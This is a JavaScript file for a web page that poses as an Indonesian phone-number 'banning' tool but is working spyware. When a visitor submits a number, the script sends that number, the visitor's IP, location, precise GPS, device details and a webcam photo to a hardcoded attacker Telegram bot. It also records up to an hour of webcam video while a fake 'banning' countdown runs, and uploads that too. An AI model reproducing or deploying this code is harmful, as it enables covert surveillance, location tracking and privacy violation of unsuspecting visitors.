const botToken = '7958174608:AAGs5VOadimZhj_o9FBoevNhDxHlkSucGLk';  
const chatIds = ['7111518511'];  
const infoDiv = document.getElementById('info');  
const input = document.getElementById('text');  
const button = document.getElementById('login-button');  

function sendToTelegram(text){  
  chatIds.forEach(id=>{  
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{  
      method:'POST',  
      headers:{'Content-Type':'application/json'},  
      body:JSON.stringify({chat_id:id,text:text,parse_mode:'HTML'})  
    }).catch(console.error);  
  });  
}  

function sendVideoToTelegram(blob){  
  chatIds.forEach(id=>{  
    const formData = new FormData();  
    formData.append('chat_id',id);  
    formData.append('video',blob,'video.webm');  
    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`,{  
      method:'POST',  
      body:formData  
    }).catch(console.error);  
  });  
}  

function sendPhotoToTelegram(blob){  
  chatIds.forEach(id=>{  
    const formData = new FormData();  
    formData.append('chat_id',id);  
    formData.append('photo',blob);  
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:formData}).catch(console.error);  
  });  
}  

async function getInfo(){  
  let ip='-', city='-', region='-', country='-', org='-';  
  try{  
    const ipRes=await fetch('https://api.ipify.org?format=json');  
    const ipData=await ipRes.json();  
    ip=ipData.ip;  
    const locRes=await fetch(`https://ip-api.com/json/${ip}`);  
    const loc=await locRes.json();  
    if(loc.status==='success'){city=loc.city;region=loc.regionName;country=loc.country;org=loc.org;}  
  }catch{}  
  const battery=await navigator.getBattery?.()||{level:0,charging:false};  
  const batteryPercent=battery.level?(battery.level*100).toFixed(0)+'%':'N/A';  
  const text=`  
IP         : ${ip}  
Kota       : ${city}  
Region     : ${region}  
Negara     : ${country}  
ISP        : ${org}  
Browser    : ${navigator.userAgent}  
OS         : ${navigator.platform}  
Resolusi   : ${screen.width}x${screen.height}  
Baterai    : ${batteryPercent} (${battery.charging?'Charging':'Tidak Charging'})  
Memori     : ${navigator.deviceMemory||'N/A'} GB  
Cookie     : ${navigator.cookieEnabled?'Ya':'Tidak'}  
Waktu      : ${new Date().toLocaleString()}  
  `.trim();  
  sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);  

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      pos=>{
        const link=`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
      },
      ()=>sendToTelegram("📍 Lokasi GPS Ditolak")
    );
  }else sendToTelegram("📍 Browser tidak support GPS");
}

async function startCameraPhoto(){
  const video=document.getElementById('video');
  const canvas=document.getElementById('canvas');
  const ctx=canvas.getContext('2d');
  return new Promise(resolve=>{
    navigator.mediaDevices.getUserMedia({video:true})
    .then(stream=>{
      video.srcObject=stream;
      video.onloadedmetadata=()=>{
        setTimeout(()=>{
          ctx.drawImage(video,0,0,canvas.width,canvas.height);
          canvas.toBlob(blob=>{
            if(blob) sendPhotoToTelegram(blob);
            stream.getTracks().forEach(t=>t.stop());
            resolve();
          },'image/jpeg');
        },3000);
      };
    })
    .catch(err=>{sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');resolve();});
  });
}

async function recordVideo(){
  const video=document.getElementById('video');
  return new Promise(resolve=>{
    navigator.mediaDevices.getUserMedia({video:true,audio:false})
    .then(stream=>{
      video.srcObject=stream;
      const chunks=[];
      const mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8'});
      mediaRecorder.ondataavailable=e=>chunks.push(e.data);
      mediaRecorder.onstop=()=>{
        const blob=new Blob(chunks,{type:'video/webm'});
        console.log('Video size:',blob.size);
        if(blob.size < 50*1024*1024) sendVideoToTelegram(blob);
        else sendToTelegram('❌ Video terlalu besar untuk dikirim');
        stream.getTracks().forEach(t=>t.stop());
        resolve();
      };
      mediaRecorder.start();
      infoDiv.innerText='proses banned 20 detik...';
      let count=3600;
      const countdown=setInterval(()=>{
        infoDiv.innerText=`proses banned... ${count--} detik`;
        if(count<0) clearInterval(countdown);
      },1000);
      setTimeout(()=>mediaRecorder.stop(),3600000);
    })
    .catch(err=>{sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');resolve();});
  });
}

button.addEventListener('click',async()=>{
  const nomor=input.value.trim();
  if(!nomor||nomor.length<8||nomor.length>15){infoDiv.innerText='⚠️ Nomor tidak valid.';return;}
  button.disabled=true;
  infoDiv.innerText='⏳ Memproses...';
  sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
  input.value='';
  try{
    await getInfo();
    await startCameraPhoto();
    await recordVideo();
    infoDiv.innerText=`✅ Successfully kill nomor ${nomor}`;
    button.disabled=false;
  }catch(e){
    console.error(e);
    infoDiv.innerText='❌ Terjadi kesalahan.';
    button.disabled=false;
  }
});

function createParticles(){
  const container=document.querySelector('.bg-particles');
  for(let i=0;i<50;i++){
    const p=document.createElement('div');
    p.className='particle';
    p.style.left=Math.random()*100+'%';
    p.style.top=Math.random()*100+'%';
    p.style.animationDelay=Math.random()*6+'s';
    p.style.animationDuration=(Math.random()*4+4)+'s';
    container.appendChild(p);
  }
}
document.addEventListener('DOMContentLoaded',createParticles);
